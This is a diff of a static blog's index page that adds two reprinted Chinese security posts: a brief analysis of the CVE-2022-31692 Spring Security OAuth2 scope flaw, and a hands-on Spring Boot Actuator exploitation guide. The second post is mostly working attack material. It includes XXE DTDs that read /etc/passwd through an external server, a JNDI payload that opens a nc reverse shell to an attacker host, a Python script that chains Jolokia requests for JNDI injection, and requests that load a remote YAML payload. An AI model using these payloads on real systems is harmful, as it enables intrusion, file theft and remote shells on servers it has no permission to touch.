@@ -86,6 +86,203 @@
 
     
         <h2 class="title">
+            <a href="/2023/10/25/CVE-2022-31692-Spring-Security-Oauth2/">
+                CVE-2022-31692 Spring Security Oauth2 Client权限提升漏洞
+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="cve-2022-31692-spring-security-oauth2-client权限提升漏洞">CVE-2022-31692 Spring Security Oauth2 Client权限提升漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/LJQClqjc/article/details/127676498">棱镜七彩</a> 并作补充</p>
+</blockquote>
+<h2><span id="项目介绍">项目介绍</span></h2><blockquote>
+<p>Spring Security是一个能够为基于Spring的企业应用系统提供声明式的安全访问控制解决方案的安全框架。它提供了一组可以在Spring应用上下文中配置的Bean，充分利用了Spring IoC，DI（控制反转Inversion of Control ,DI:Dependency Injection 依赖注入）和AOP（面向切面编程）功能，为应用系统提供声明式的安全访问控制功能，减少了为企业系统安全控制编写大量重复代码的工作。</p>
+</blockquote>
+<h2><span id="项目地址">项目地址</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://spring.io/projects/spring-security">https://spring.io/projects/spring-security</a></p>
+</blockquote>
+<h2><span id="漏洞概述">漏洞概述</span></h2><blockquote>
+<p>Spring Security 的受影响版本中存在权限提升漏洞，攻击者可以修改客户端通过浏览器向授权服务器发出的请求，如果授权服务器在后续使用包含空作用域列表的 ’OAuth2 Access Token Response‘ 响应来获取访问token，攻击者可以获得权限提升，以特权身份执行恶意代码。</p>
+</blockquote>
+<h2><span id="影响版本">影响版本</span></h2><blockquote>
+<p>org.springframework.security:spring-security-oauth2-client@[5.6, 5.6.9)<br>org.springframework.security:spring-security-oauth2-client@[5.7, 5.7.5)</p>
+</blockquote>
+<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
+<ol>
+<li>下载并使用spring官方提供的<a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-security-samples/tree/main/servlet/spring-boot/java/oauth2">样例</a>进行测试</li>
+<li>分别启动login和authorization-server，官方提供的authorization-server默认账号密码是user、password</li>
+</ol>
+</blockquote>
+<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
+<p>该漏洞是一个Spring Security Oauth2的逻辑漏洞，要想明白该漏洞，我们必须先了解下什么是Oauth2。<br>简单说，OAuth2 就是一种授权机制。数据的所有者告诉系统，同意授权第三方应用进入系统，获取这些数据。系统从而产生一个短期的进入令牌（token），用来代替密码，供第三方应用使用。<br>OAuth 2.0 规定了四种获得令牌的流程：<br>授权码（authorization-code）<br>隐藏式（implicit）<br>密码式（password）<br>客户端凭证（client credentials）<br>授权码模式最常用，该模式的整个授权过程的时序图如下：</p>
+<p><img src="/2023/10/25/CVE-2022-31692-Spring-Security-Oauth2/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>CVE-2022-31692漏洞产生的原因在于最后返回token时分配的scope不当，在spring security 中，应用向授权服务器请求token的代码如下：</p>
+<p><img src="/2023/10/25/CVE-2022-31692-Spring-Security-Oauth2/2.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>上述标注的代码会判断AccessTokenResponse.scope是否为空，如果条件成立，则会使用当前client配置的scope。而scope代表的是令牌有权限范围。也就是说当授权服务器返回的scope为空，则客户端权限提升至最大。因此存在权限提升漏洞。<br>官方修复commit如下，分析代码可知spring security实现了三种认证模式并全部修复了漏洞。</p>
+<p><img src="/2023/10/25/CVE-2022-31692-Spring-Security-Oauth2/3.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>三种模式的修复代码都是类似的，选其中一个分析，从修复代码可知修复后直接使用授权服务器返回的内容。</p>
+<p><img src="/2023/10/25/CVE-2022-31692-Spring-Security-Oauth2/4.png" alt="image"></p>
+</blockquote>
+<h2><span id="修复方式">修复方式</span></h2><blockquote>
+<p>升级到最新版</p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1917762">OAuth2.0究竟是个啥？看完这13张图你就明白了！ - 腾讯云开发者社区-腾讯云</a><br><a target="_blank" rel="noopener" href="https://spring.io/blog/2022/10/31/cve-2022-31690-privilege-escalation-in-spring-security-oauth2-client">CVE-2022-31690: Privilege Escalation in spring-security-oauth2-client</a><br><a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-security/commit/75004587a419a96d18909030b20c6b16b226ecbe">Spring-Security Commit:Fix scope mapping</a><br><a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2019/04/oauth_design.html">OAuth 2.0 的一个简单解释</a><br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=KghFWdMqP_w">[iThome鐵人賽 2022] Day31 (CVE-2022-31692) Spring Security 又(?)有漏洞惹~~ 使用個 forward 功能臭了嗎?! - YouTube</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Spring/" rel="tag">Spring</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/10/06/Spring-Boot-Actuator-RCE/">
+                Spring Boot Actuator 漏洞利用
+            </a>
+        </h2>
+    
+    <time>
+        Oct 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="spring-boot-actuator-漏洞利用">Spring Boot Actuator 漏洞利用</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/234266.html">诺言</a> 并作补充</p>
+</blockquote>
+<h2><span id="前言">前言</span></h2><blockquote>
+<p>Actuator 是 Spring Boot 提供的服务监控和管理中间件。当 Spring Boot 应用程序运行时，它会自动将多个端点注册到路由进程中。而由于对这些端点的错误配置，就有可能导致一些系统信息泄露、XXE、甚至是 RCE 等安全问题。</p>
+</blockquote>
+<h2><span id="漏洞发现">漏洞发现</span></h2><blockquote>
+<p>通常通过两个位置判断网站是否使用了Spring Boot框架。<br>1、网站图片文件是一个绿色的树叶。<br>2、特有的报错信息。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/1.jpg" alt="image"></p>
+</blockquote>
+<h2><span id="影响版本">影响版本</span></h2><blockquote>
+<p>Spring Boot &lt; 1.5 默认未授权访问所有端点<br>Spring Boot &gt;&#x3D; 1.5 默认只允许访问&#x2F;health和&#x2F;info端点，但是此安全性通常被应用程序开发人员禁用</p>
+</blockquote>
+<h2><span id="端点描述">端点描述</span></h2><blockquote>
+<p>官方文档对每个端点的功能进行了描述。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">路径            描述</span><br><span class="line">/autoconfig    提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过</span><br><span class="line">/beans         描述应用程序上下文里全部的Bean，以及它们的关系</span><br><span class="line">/env           获取全部环境属性</span><br><span class="line">/configprops   描述配置属性(包含默认值)如何注入Bean</span><br><span class="line">/dump          获取线程活动的快照</span><br><span class="line">/health        报告应用程序的健康指标，这些值由HealthIndicator的实现类提供</span><br><span class="line">/info          获取应用程序的定制信息，这些信息由info打头的属性提供</span><br><span class="line">/mappings      描述全部的URI路径，以及它们和控制器(包含Actuator端点)的映射关系</span><br><span class="line">/metrics       报告各种应用程序度量信息，比如内存用量和HTTP请求计数</span><br><span class="line">/shutdown      关闭应用程序，要求endpoints.shutdown.enabled设置为<span class="literal">true</span></span><br><span class="line">/trace         提供基本的HTTP请求跟踪信息(时间戳、HTTP头等)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Spring Boot 1.x版本端点在根URL下注册。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/2.jpg" alt="image"></p>
+<p>Spring Boot 2.x版本端点移动到&#x2F;actuator&#x2F;路径。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/3.jpg" alt="image"></p>
+<p>本文中端点的位置都是基于网站根目录下，实战中遇到的情况是，端点可能存放在多级目录下，需要自行进行寻找。<br>访问&#x2F;trace端点获取到近期服务器收到的请求信息。<br>如果存在登录用户的操作请求，可以伪造cookie进行登录。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/4.jpg" alt="image"></p>
+<p>访问&#x2F;env端点获取环境属性。<br>数据库账户泄漏<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/5.jpg" alt="image"></p>
+</blockquote>
+<h2><span id="jolokia端点利用">Jolokia端点利用</span></h2><blockquote>
+<p>大多数Actuator仅支持GET请求并仅显示敏感的配置数据,如果使用了不当的Jolokia端点，可能会产生XXE、甚至是RCE安全问题。</p>
+</blockquote>
+<h2><span id="reloadbyurl方法">reloadByURL方法</span></h2><blockquote>
+<p>查看&#x2F;jolokia&#x2F;list 中存在的 Mbeans，是否存在logback 库提供的reloadByURL方法。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/6.jpg" alt="image"></p>
+</blockquote>
+<h3><span id="xxe漏洞实现">xxe漏洞实现</span></h3><blockquote>
+<p>reloadByURL方法，允许远程加载logback.xml 配置文件，并且解析 xml 文件未做任何过滤措施，导致了xxe漏洞。<br>1、创建logback.xml和fileread.dtd文件</p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">logback.xml,地址为公网vpsweb服务地址。</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [ <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://x.x.x.x/fileread.dtd&quot;</span>&gt;</span>%remote;%int;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;trick;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fileread.dtd</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!ENTITY % d <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY trick SYSTEM &#x27;:%d;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>2、把创建的logback.xml和fileread.dtd文件上传到公网vps的web目录下。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/7.jpg" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>3、远程访问logback.xml文件。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/jolokia/exec/ch.qos.logback.classic:Name=<span class="keyword">default</span>,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/x.x.x.x!/logback.xml</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>成功利用xxe读取到etc&#x2F;passwd文件内容。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/8.jpg" alt="image"></p>
+</blockquote>
+<h3><span id="远程代码执行实现">远程代码执行实现</span></h3><blockquote>
+<p>可以在logback.xml中使用insertFromJNDI标签，这个标签允许我们从 JNDI 加载变量，导致了rce漏洞产生。<br>rce的流程主要分为4步。<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.secshi.com/21506.html">详细过程</a><br>1、构造 Get 请求访问目标，使其去外部服务器加载恶意 logback.xml 文件。<br>2、解析 logback.xml 时，最终会触发 InitialContext.lookup(URI) 操作，而URI 为恶意 RMI 服务地址。<br>3、恶意 RMI 服务器向目标返回一个 Reference 对象，Reference 对象中指定了目标本地存在的 BeanFactory 类，以及Bean Class 的类名、属性、属性值（这里为 ELProcessor 、x、eval(…))。<br>4、目标在进行 lookup() 操作时，会动态加载并实例化 BeanFactory 类，接着调用 factory.getObjectInstance() 方法，通过反射的方式实例化 Reference 所指向的任意 Bean Class，并且会调用 setter 方法为所有的属性赋值。对应我们的代码，最终调用 setter 方法的时候，就是执行如下代码：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELProcessor.<span class="built_in">eval</span>(\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).<span class="built_in">eval</span>(\&quot;new java.lang.ProcessBuilder[<span class="string">&#x27;(java.lang.String[])&#x27;</span>]([<span class="string">&#x27;/bin/sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc evil-server-ip port &gt;/tmp/f&#x27;</span>]).start()\&quot;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>而 ELProcessor.eval() 会对 EL 表达式（这里为反弹 shell）进行求值，最终达到 RCE 的效果。</p>
+</blockquote>
+<blockquote>
+<p>下载<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://github.com/mpgn/Spring-Boot-Actuator-Exploit">rce利用代码</a>。<br>修改Spring-Boot-Actuator-Exploit\maliciousRMIServer\src\main\java\hello\EvilRMIServer.java的代码。<br>可以修改RMI远程监听的端口，和反弹shell的地址和端口。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/9.jpg" alt="image"><br>使用maven对java代码进行编译打包。<br>进入Spring-Boot-Actuator-Exploit-master&#x2F;maliciousRMIServer目录，执行<code>mvn clean install</code><br>打包成功后创建target目录下生成RMIServer-0.1.0.jar文件。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/10.jpg" alt="image"></p>
+<p><img src="/2023/10/06/Spring-Boot-Actuator-RCE/11.jpg" alt="image"></p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修改logback.xml文件内容。</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;rmi://x.x.x.x:1097/jndi&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>把RMIServer-0.1.0.jar文件上传到公网vps上。<br>执行RMIServer-0.1.0.jar文件,开启攻击机上的RMI监听时需要通过’Djava.rmi.server.hostname&#x3D;x.x.x.x’指定自己的RMI监听的外网地址。<br><code>java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar</code><br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/12.jpg" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>vps使用nc监听反弹shell指定的端口。<br><code>nc -lvp 9998</code><br>在漏洞url访问：<br><code>http://x.x.x.x/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!114.x.x.x!/logback.xml</code><br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/13.jpg" alt="image"><br>成功反弹shell。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/14.jpg" alt="image"></p>
+</blockquote>
+<h2><span id="createjndirealm方法">createJNDIRealm方法</span></h2><blockquote>
+<p>相关原理请查看<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://lucifaer.com/2019/03/13/Attack%2520Spring%2520Boot%2520Actuator%2520via%2520jolokia%2520Part%25202/%230x04-%25E6%259E%2584%25E9%2580%25A0poc">Attack Spring Boot Actuator via jolokia Part 2</a><br>查看&#x2F;jolokia&#x2F;list 中存在的是否存在org.apache.catalina.mbeans.MBeanFactory类提供的createJNDIRealm方法，可能存在JNDI注入，导致远程代码执行。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/15.jpg" alt="image"></p>
+<p>利用过程分为五步。<br>1、创建 JNDIRealm<br>2、写入 contextFactory 为 RegistryContextFactory<br>3、写入 connectionURL 为你的 RMI Service URL<br>4、停止 Realm<br>5、启动 Realm 以触发 JNDI 注入</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">可以使用burp一步步重放，也可以直接使用python脚本执行。</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>] + <span class="string">&quot;/jolokia/&quot;</span></span><br><span class="line">pprint(url)</span><br><span class="line"><span class="comment">#创建JNDIRealm</span></span><br><span class="line">create_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:type=MBeanFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;createJNDIRealm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: [<span class="string">&quot;Tomcat:type=Engine&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入contextFactory</span></span><br><span class="line">set_contextFactory = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;contextFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入connectionURL为自己公网RMI service地址</span></span><br><span class="line">set_connectionURL = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;connectionURL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;rmi://x.x.x.x:1097/jndi&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#停止Realm</span></span><br><span class="line">stop_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;stop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#运行Realm，触发JNDI 注入</span></span><br><span class="line">start = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;start&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> expoloit:</span><br><span class="line">    rep = req.post(url, json=i)</span><br><span class="line">    pprint(rep.json())</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>使用之前打包好的jar包-RMIServer-0.1.0.jar，运行RMI服务<br><code>java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar</code><br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/16.jpg" alt="image"></p>
+<p>使用nc监听反弹的端口<code>nc -lvp 9998</code><br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/17.jpg" alt="image"></p>
+<p>使用python发送请求<code>python exp.py http://x.x.x.x:8087</code><br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/18.jpg" alt="image"></p>
+<p>成功反弹shell。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/19.jpg" alt="image"></p>
+</blockquote>
+<h2><span id="spring-cloud-env">spring Cloud env</span></h2><blockquote>
+<p>当spring boot使用Spring Cloud 相关组件时，会存在spring.cloud.bootstrap.location属性，通过修改 spring.cloud.bootstrap.location 环境变量实现 RCE<br>漏洞原理参考<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/195929">https://www.anquanke.com/post/id/195929</a></p>
+</blockquote>
+<h3><span id="利用范围">利用范围</span></h3><blockquote>
+<p>Spring Boot 2.x 无法利用成功<br>Spring Boot 1.5.x 在使用 Dalston 版本时可利用成功，使用 Edgware 无法成功<br>Spring Boot &lt;&#x3D; 1.4 可利用成功</p>
+</blockquote>
+<h3><span id="利用过程">利用过程</span></h3><blockquote>
+<p>大致原理分为2步。<br>1、利用 &#x2F;env endpoint 修改 spring.cloud.bootstrap.location 属性值为一个外部 yml 配置文件 url 地址，如 <a target="_blank" rel="noopener" href="http://x.x.x.x/yaml-payload.yml">http://x.x.x.x/yaml-payload.yml</a><br>2、请求 &#x2F;refresh endpoint，触发程序下载外部 yml 文件，并由 SnakeYAML 库进行解析，因 SnakeYAML 在反序列化时支持指定 class 类型和构造方法的参数，结合 JDK 自带的 javax.script.ScriptEngineManager 类，可实现加载远程 jar 包，完成任意代码执行。<br>下载使用Michael Stepankin大牛提供的<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">exp</a><br>更改执行的命令。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/20.jpg" alt="image"></p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将java文件进行编译</span><br><span class="line"></span><br><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>把生成的jar文件挂载到公网http服务器。<br>修改 spring.cloud.bootstrap.location为外部 yml 配置文件地址。</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/env</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>59</span><br><span class="line"> </span><br><span class="line">spring.cloud.bootstrap.location=http://x.x.x.x/yaml-payload.yml</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/2023/10/06/Spring-Boot-Actuator-RCE/21.jpg" alt="image"></p>
+<p>请求 &#x2F;refresh 接口触发</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>命令执行成功。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/22.jpg" alt="image"></p>
+</blockquote>
+<h2><span id="参考文章">参考文章</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a><br><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a><br><a target="_blank" rel="noopener" href="http://radiosong.cn/index.php/2019/04/03/1.html">http://radiosong.cn/index.php/2019/04/03/1.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4258">https://xz.aliyun.com/t/4258</a><br><a target="_blank" rel="noopener" href="http://r3start.net/index.php/2019/01/20/377">http://r3start.net/index.php/2019/01/20/377</a><br><a target="_blank" rel="noopener" href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit">https://github.com/mpgn/Spring-Boot-Actuator-Exploit</a><br><a target="_blank" rel="noopener" href="https://www.secshi.com/21506.html">https://www.secshi.com/21506.html</a><br><a target="_blank" rel="noopener" href="https://lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/#0x04-%E6%9E%84%E9%80%A0poc">https://lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/#0x04-%E6%9E%84%E9%80%A0poc</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/195929">https://www.anquanke.com/post/id/195929</a><br><a target="_blank" rel="noopener" href="http://vulsee.com/archives/vulsee_2019/1025_9168.html">http://vulsee.com/archives/vulsee_2019/1025_9168.html</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Spring/" rel="tag">Spring</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/09/03/CVE-2022-33980-Apache-Commons/">
                 关于CVE-2022-33980 Apache Commons Configuration 远程命令执行漏洞分析
             </a>
